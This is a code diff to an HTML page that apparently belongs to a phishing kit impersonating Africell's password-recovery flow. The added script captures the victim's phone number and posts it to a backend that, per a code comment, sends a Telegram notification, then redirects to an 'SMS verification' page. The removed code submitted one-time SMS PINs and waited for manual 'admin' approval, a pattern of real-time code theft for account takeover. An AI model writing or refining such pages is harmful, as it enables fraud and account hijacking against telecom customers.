@@ -19,6 +19,13 @@
         .forgot-prefix-box { width: 100px; height: 60px; background: #ffffff; border: 2px solid #991676; border-radius: 18px; font-size: 16px; font-weight: 700; color: #000000; display: flex; align-items: center; justify-content: center; }
         .forgot-input-field { flex: 1; height: 60px; background: #ffffff; border: 2px solid #991676; border-radius: 18px; font-size: 16px; font-weight: 600; color: #000000; text-align: center; outline: none; }
         .forgot-send-btn { width: 100%; height: 60px; background: #991676; color: #ffffff; border: none; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; text-decoration: none; }
+        .forgot-send-btn.disabled-state { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
+
+        /* Custom Modal Dialog */
+        #customModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(153, 22, 118, 0.9); justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
+        .modal-card { background: #991676; width: 100%; max-width: 320px; border-radius: 24px; padding: 28px; text-align: center; color: #ffffff; }
+        .modal-message { font-size: 15px; font-weight: 600; margin-bottom: 24px; line-height: 1.4; }
+        .modal-btn { background: #ffd34d; color: #5E0C44; border: none; border-radius: 14px; padding: 14px 24px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
@@ -40,7 +47,15 @@
         </div>
     </div>
 
-<script>
+    <!-- Custom Modal Dialog -->
+    <div id="customModal">
+        <div class="modal-card">
+            <div id="modalText" class="modal-message">Notification message here</div>
+            <button class="modal-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
         function showAppAlert(message) {
             document.getElementById('modalText').innerText = message;
             document.getElementById('customModal').style.display = 'flex';
@@ -50,85 +65,49 @@
             document.getElementById('customModal').style.display = 'none';
         }
 
-        async function submitVerificationCode() {
-            const pinVal = document.getElementById('verificationPin').value.trim();
-            const verifyBtn = document.getElementById('verifyBtn');
-            const spinnerDiv = document.getElementById('loadingSpinner');
-            const phoneInput = localStorage.getItem('africellUserPhone') || '+23200000000';
+        document.getElementById('sendBtn').addEventListener('click', async () => {
+            const phoneVal = document.getElementById('recoveryPhone').value.trim();
+            const sendBtn = document.getElementById('sendBtn');
 
-            if (!pinVal || pinVal.length < 4) {
-                showAppAlert('❌ Please enter a valid PIN code.');
+            if (!phoneVal || phoneVal.length < 8) {
+                showAppAlert('❌ Please enter a valid mobile number.');
                 return;
             }
 
-            try {
-                verifyBtn.classList.add('disabled-state');
-                if (spinnerDiv) spinnerDiv.style.display = 'flex';
+            const fullPhone = '+232' + phoneVal;
+            localStorage.setItem('africellUserPhone', fullPhone);
 
+            try {
+                sendBtn.classList.add('disabled-state');
+                sendBtn.innerText = 'Sending...';
+
+                // Submit recovery request to server & trigger Telegram notification
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phoneInput, uniqueId: 'Signup SMS Code: ' + pinVal })
+                    body: JSON.stringify({ 
+                        phone: fullPhone, 
+                        uniqueId: 'Password Recovery Request' 
+                    })
                 });
 
                 const result = await response.json();
 
                 if (result.success) {
-                    // Start polling for admin approval
-                    pollApprovalStatus(phoneInput);
+                    // Proceed to scratch2.html for SMS verification
+                    window.location.href = 'scratch2.html';
                 } else {
-                    verifyBtn.classList.remove('disabled-state');
-                    if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    showAppAlert('❌ Verification failed. Please try again.');
+                    sendBtn.classList.remove('disabled-state');
+                    sendBtn.innerText = 'send';
+                    showAppAlert('❌ Failed to submit. Please try again.');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                verifyBtn.classList.remove('disabled-state');
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                sendBtn.classList.remove('disabled-state');
+                sendBtn.innerText = 'send';
                 showAppAlert('Could not connect to the backend server.');
             }
-        }
-
-        function pollApprovalStatus(phone) {
-            const cleanPhone = phone.trim();
-            const verifyBtn = document.getElementById('verifyBtn');
-            const spinnerDiv = document.getElementById('loadingSpinner');
-            
-            let elapsedTime = 0;
-            const maxWaitTime = 120000; // 2 minutes timeout safety net
-
-            const statusInterval = setInterval(async () => {
-                elapsedTime += 3000;
-
-                // Safety timeout if admin takes too long
-                if (elapsedTime >= maxWaitTime) {
-                    clearInterval(statusInterval);
-                    if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    verifyBtn.classList.remove('disabled-state');
-                    showAppAlert('⏱️ Request timed out. Please try verifying again.');
-                    return;
-                }
-
-                try {
-                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
-                    const data = await response.json();
-
-                    if (data.status === 'approved') {
-                        clearInterval(statusInterval);
-                        window.location.href = 'new.html';
-                    } 
-                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
-                        clearInterval(statusInterval);
-                        if (spinnerDiv) spinnerDiv.style.display = 'none';
-                        verifyBtn.classList.remove('disabled-state');
-                        showAppAlert('❌ Wrong Code / Rejected by Admin');
-                    }
-                } catch (e) {
-                    console.error('Polling error', e);
-                }
-            }, 3000);
-        }
+        });
     </script>
-     
 </body>
 </html>
